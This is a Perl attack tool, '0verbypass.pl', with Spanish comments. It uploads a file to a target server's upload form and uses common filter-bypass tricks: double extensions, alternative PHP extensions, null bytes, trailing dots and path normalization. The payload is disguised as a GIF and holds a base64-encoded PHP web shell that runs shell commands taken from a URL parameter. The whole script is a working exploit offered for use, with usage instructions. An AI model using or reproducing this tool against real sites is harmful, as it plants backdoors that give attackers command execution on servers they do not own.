###################0verbypass.pl v0.1###################
#   Esta herramienta está diseñada para bypassear los  #
#   uploaders utilizando los métodos más comunes que   #
#   se suelen usar. Para cada uploader hay que cambiar #        
#   name=\"archivo\"; en la línea 52                   #
########################################################
#  Autor: The X-C3LL (overloadblog at hotmail dot com) #
#  Blog: 0verl0ad.blogspot.com                         #
########################################################
#  Uso: perl 0verbypass.pl [HOST] [FILE] [OPTION]      #
#                                                      #
#   -[Opciones]-                                       #
# -d Doble extension                                   #
# -x Extensiones menos conocidas                       #
# -n Null byte                                         #
# -l Puntos al final                                   #
# -p Normalizacion de rutas                            #
########################################################
#              Agradecimientos a Seth                  #
########################################################
 
 
use IO::Socket;
use MIME::Base64;
 
$host = $ARGV[0];
$php = $ARGV[1];
$opt = $ARGV[2];
 
if ($opt eq "-d"){ &cabecera($host,$php,"0verl0ad.gIf.PhP","228"); } elsif ($opt eq "-x") { &cabecera($host,$php,"0verl0ad.PhP5","226"); }
elsif ($opt eq "-n") { &cabecera($host,$php,'0verl0ad.pHP\0.gif',"227"); } elsif ($opt eq "-l"){ &cabecera($host,$php,"0verl0ad.PhP. ..","229"); }
elsif ($opt eq "-p") { &cabecera($host,$php,"0verl0ad.pHp/././././././././././","246");}
else { &help; }
 
 
 
 
 
sub cabecera{
 
print q (
-=======[0verbypass.pl v0.1]=======-
 
[+] Conectando con el host...
);
 
 
$peticion = "POST $_[1] HTTP/1.1\n";
$peticion .= "Host: $_[0]";
$peticion .= "\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------14171267928964\nContent-Length: $_[3]\n\n";
 
$peticion .= "-----------------------------14171267928964\nContent-Disposition: form-data; name=\"archivo\"; filename=\"$_[2]\"";
$peticion .= "\nContent-Type: image/gif\n\n";
 
$peticion .= "GIF89a";
$peticion .= decode_base64("PD9waHAgc3lzdGVtKCRfR0VUWydmdWNrJ10pOyA/Pg==");
$peticion .= "\n-----------------------------14171267928964--\n\n";
$socket = IO::Socket::INET->new(
                                Proto => "tcp",
                                PeerAddr => $_[0],
                                PeerPort => "80",
                                ) || die "[-] Error: no se pudo conectar con el host";
 
 
print "[+] Enviando peticion...\n\n";
print $socket $peticion;
print $peticion;
print "[+] Peticion enviada\n";
@server = <$socket>;
  if ($server[0] =~ /200/ ) {
       print "[+] Archivo subido correctamente\n";
  } else { print "[-] Error: el archivo no pudo subirse";
 
}
 
close($peticion);
 
}
 
 
sub help {
print q(
-=======[0verbypass.pl v0.1]=======-
 
Usage: perl 0verbypass.pl [HOST] [FILE] [OPTION]
 
-=[OPTIONS]=-
-d Doble extension
-x Extensiones menos conocidas
-n Null byte
-l Puntos al final
-p Normalizacion de rutas
 
);
 
}
